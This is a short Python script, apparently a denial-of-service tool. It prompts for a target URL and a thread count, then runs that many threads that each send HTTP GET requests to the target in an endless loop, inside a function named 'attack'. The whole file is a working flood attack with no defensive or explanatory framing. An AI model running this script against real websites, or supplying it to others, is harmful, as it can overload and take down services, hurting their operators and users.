import requests
from threading import Thread

target = input("Enter the target URL: ")
num_threads = int(input("Enter the number of threads: "))

def attack():
    while True:
        try:
            response = requests.get(target)
            print(f"Request sent, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

threads = []
for _ in range(num_threads):
    t = Thread(target=attack)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
